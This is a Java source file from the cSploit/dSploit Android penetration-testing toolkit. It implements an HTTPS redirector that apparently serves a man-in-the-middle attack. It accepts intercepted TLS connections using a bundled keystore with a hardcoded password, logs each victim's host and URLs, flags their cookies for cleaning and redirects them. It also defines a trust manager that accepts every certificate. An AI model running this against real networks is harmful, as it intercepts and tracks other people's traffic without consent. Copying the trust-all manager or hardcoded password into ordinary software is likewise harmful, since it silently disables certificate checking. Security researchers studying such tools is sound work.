/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.csploit.android.net.http.proxy;

import android.content.Context;

import org.csploit.android.core.Logger;
import org.csploit.android.core.System;
import org.csploit.android.net.http.RequestParser;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.security.KeyManagementException;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.UnrecoverableKeyException;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.ArrayList;

import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLException;
import javax.net.ssl.SSLHandshakeException;
import javax.net.ssl.SSLProtocolException;
import javax.net.ssl.SSLServerSocket;
import javax.net.ssl.SSLServerSocketFactory;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

public class HTTPSRedirector implements Runnable
{
  private static final int BACKLOG = 255;

  private static final String KEYSTORE_FILE = "csploit.p12";
  private static final String KEYSTORE_PASS = "1234";

  private Proxy.OnRequestListener mRequestListener = null;
  private Context mContext = null;
  private InetAddress mAddress = null;
  private int mPort = System.HTTPS_REDIR_PORT;
  private boolean mRunning = false;
  private SSLServerSocket mSocket = null;

  public void setOnRequestListener(Proxy.OnRequestListener listener){ mRequestListener = listener; }

  public HTTPSRedirector(Context context, InetAddress address, int port) throws IOException, KeyStoreException, CertificateException, NoSuchAlgorithmException, UnrecoverableKeyException, KeyManagementException{
    mContext = context;
    mAddress = address;
    mPort = port;
    mSocket = getSSLSocket();
  }

  private SSLServerSocket getSSLSocket() throws IOException, KeyStoreException, CertificateException, NoSuchAlgorithmException, UnrecoverableKeyException, KeyManagementException{
    //java.lang.System.setProperty("javax.net.ssl.keyStore", KEYSTORE_FILE);
    //java.lang.System.setProperty("javax.net.ssl.keyStorePassword", KEYSTORE_PASS);

    KeyStore keyStore = KeyStore.getInstance("PKCS12");

    InputStream _ssl_cert = mContext.getAssets().open(KEYSTORE_FILE);
    if (_ssl_cert == null) {
      File _cert = new File(mContext.getFilesDir().getPath() + "/" + KEYSTORE_FILE);
      FileInputStream fis = null;
      if (_cert.exists() == false) {
        Logger.info("Using CERT: /sdcard/csploit/" + KEYSTORE_FILE);
        _cert = new File("/sdcard/csploit/" + KEYSTORE_FILE);
        fis = new FileInputStream(_cert);
      } else
        fis = new FileInputStream(_cert);

      keyStore.load(fis, KEYSTORE_PASS.toCharArray());
      fis.close();
      Logger.info("getSSLSocket() Loading KEYSTORE from: " + _cert.getAbsoluteFile());
    }
    else{
      Logger.info("getSSLSocket() Loading KEYSTORE from assets");
      keyStore.load(_ssl_cert, KEYSTORE_PASS.toCharArray());
    }

    KeyManagerFactory keyMan = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());
    keyMan.init(keyStore, KEYSTORE_PASS.toCharArray());

    TrustManager[] tm = new TrustManager[] { new NaiveTrustManager() };
    SSLContext sslContext = SSLContext.getInstance("TLS");
    sslContext.init(keyMan.getKeyManagers(), tm, null);

    SSLServerSocketFactory sslFactory = sslContext.getServerSocketFactory();

    return (SSLServerSocket) sslFactory.createServerSocket(mPort, BACKLOG, mAddress);
  }

  public void stop(){
    Logger.debug("Stopping HTTPS redirector ...");

    try{
      if(mSocket != null)
        mSocket.close();
    }
    catch(IOException e){ }

    mRunning = false;
    mSocket = null;
  }

  @Override
  public void run(){
    try{
      Logger.debug("HTTPS redirector started on " + mAddress + ":" + mPort);

      if(mSocket == null)
        mSocket = getSSLSocket();

      mRunning = true;

      while(mRunning && mSocket != null){
        try{
          final SSLSocket client = (SSLSocket) mSocket.accept();

          Logger.info("SSLClient SSL session cipher: " + client.getSession().getCipherSuite());
          Logger.info("SSLClient SSL PeerHost: " + client.getSession().getPeerHost());
          Logger.info("SSLClient SSL protocol: " + client.getSession().getProtocol());
          //Logger.info("SSLClient PeerCertificate: " + ((client.getSession().getPeerCertificates().length > 0) ? client.getSession().getPeerCertificates()[0].toString() : ""));
          //Logger.info("SSLClient SubjectDN: " + ((client.getSession().getPeerCertificateChain().length > 0) ? client.getSession().getPeerCertificateChain()[0].getSubjectDN(): "No DN"));

          // Process client request on a new thread
          new Thread(new Runnable(){
            @Override
            public void run(){
              String clientAddress = client.getInetAddress().getHostAddress();

              try{
                Logger.debug("Incoming connection from " + clientAddress + " (request to: " + client.getPort() + ":" + client.getRemoteSocketAddress().toString() + ")");

                InputStream reader = client.getInputStream();

                // Apache's default header limit is 8KB.
                byte[] buffer = new byte[8192];
                int read = 0;
                String serverName = null;

                // Read the header and rebuild it
                if((read = reader.read(buffer, 0, 8192)) > 0){
                  ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(buffer, 0, read);
                  BufferedReader bReader = new BufferedReader(new InputStreamReader(byteArrayInputStream));
                  StringBuilder builder = new StringBuilder();
                  String line = null;
                  ArrayList<String> headers = new ArrayList<String>();
                  boolean headersProcessed = false;

                  while((line = bReader.readLine()) != null){
                    if(headersProcessed == false){
                      headers.add(line);

                      // \r\n\r\n received ?
                      if(line.trim().isEmpty())
                        headersProcessed = true;

                      else if(line.indexOf(':') != -1){
                        String[] split = line.split(":", 2);
                        String header = split[0].trim(),
                          value = split[1].trim();

                        // Extract the real request target.
                        if(header.equals("Host"))
                          serverName = value;

                        if(header != null)
                          line = header + ": " + value;
                      }
                    }

                    // build the patched request
                    builder.append(line + "\n");

                    if (mRequestListener != null){
                      Logger.info("OnSSLRequest() mRequestListener : " + serverName);
                      if (serverName != null)
                        mRequestListener.onRequest(true, clientAddress, serverName, RequestParser.getUrlFromRequest(serverName, builder.toString()).replace("http://", "https://"), headers);
                      else
                        Logger.error("ONSSLRequest server null");
                    }
                    else{
                      Logger.info("mRequestListener null");
                    }
                  }

                  if(serverName != null){
                    BufferedOutputStream writer = new BufferedOutputStream(client.getOutputStream());

                    String request = builder.toString(),
                      url = RequestParser.getUrlFromRequest(serverName, request),
                      response = "HTTP/1.1 302 Found\n" +
                        "Location: " + url + "\n" +
                        "Connection: close\n\n";

                    CookieCleaner.getInstance().addCleaned(clientAddress, serverName);
                    HTTPSMonitor.getInstance().addURL(clientAddress, url);

                    Logger.warning("Redirecting " + clientAddress + " to " + url);

                    writer.write(response.getBytes());
                    writer.flush();

                    writer.close();
                  }
                }

                reader.close();
              }
              catch (SSLHandshakeException e){
                Logger.debug("(" + clientAddress + ") HTTPSRedirector SSLHandshakeException: " + e.getMessage());
                System.errorLogging(e);
              }
              catch (SSLProtocolException e){
                // usually fired when the browser has stopped the request, due to a non valid SSL cert.
                Logger.debug("(" + clientAddress + ") HTTPSRedirector SSLProtocolException: " + e.getMessage());
                System.errorLogging(e);
              }
              catch (SSLException e){
                Logger.debug("(" + clientAddress + ") HTTPSRedirector SSLException: " + e.getMessage());
                System.errorLogging(e);
              }
              catch(IOException e){
                Logger.debug("(" + clientAddress + ") HTTPSRedirector IOException: " + e.getMessage());
                System.errorLogging(e);
              }
            }
          }).start();
        }
        catch(Exception e){
          Logger.debug("HTTPSRedirector while() Exception: " + e.getMessage());
          System.errorLogging(e);
        }
      }

      Logger.debug("HTTPS redirector stopped.");
    }
    catch(Exception e){
      Logger.debug("HTTPSRedirector run() Exception: " + e.getMessage());
      System.errorLogging(e);
    }
  }










  /**
   * This Trust Manager is "naive" because it trusts everyone.
   **/
  public class NaiveTrustManager implements X509TrustManager
  {
    /**
     * Doesn't throw an exception, so this is how it approves a certificate.
     * @see javax.net.ssl.X509TrustManager#checkClientTrusted(java.security.cert.X509Certificate[], String)
     **/
    public void checkClientTrusted ( X509Certificate[] cert, String authType )
            throws CertificateException
    {
    }

    /**
     * Doesn't throw an exception, so this is how it approves a certificate.
     * @see javax.net.ssl.X509TrustManager#checkServerTrusted(java.security.cert.X509Certificate[], String)
     **/
    public void checkServerTrusted ( X509Certificate[] cert, String authType )
            throws CertificateException
    {
    }

    /**
     * @see javax.net.ssl.X509TrustManager#getAcceptedIssuers()
     **/
    public X509Certificate[] getAcceptedIssuers ()
    {
      return null;  // I've seen someone return new X509Certificate[ 0 ];
    }
  }
}
